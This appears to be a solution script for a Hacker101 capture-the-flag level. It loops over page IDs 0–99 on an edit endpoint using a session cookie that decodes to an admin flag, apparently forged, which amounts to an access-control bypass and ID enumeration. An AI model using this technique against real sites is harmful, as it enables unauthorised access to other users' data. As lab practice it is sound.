import requests

url = 'https://6f0aec2b9d1094961d43f95ffdd4d9f6.ctf.hacker101.com/page/edit/'

headers = {
    'Host': '6f0aec2b9d1094961d43f95ffdd4d9f6.ctf.hacker101.com',
    'Cookie': '_ga=GA1.2.795290069.1677293845; _ga_K45575FWB8=GS1.1.1690389977.4.1.1690389984.53.0.0; _ga_W62NXF3JMB=GS1.1.1690569642.16.1.1690571159.0.0.0; _gid=GA1.2.1049570199.1690560925; l2session=eyJhZG1pbiI6dHJ1ZX0.ZMQR6w.dBEBMN7e-T0Vvn6Nos4R97ZSMok',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Te': 'trailers'
}

for j in range(100):
    res = requests.post(url + str(j), headers=headers)
    
    if res.status_code == 200:
        print(res.text)
        
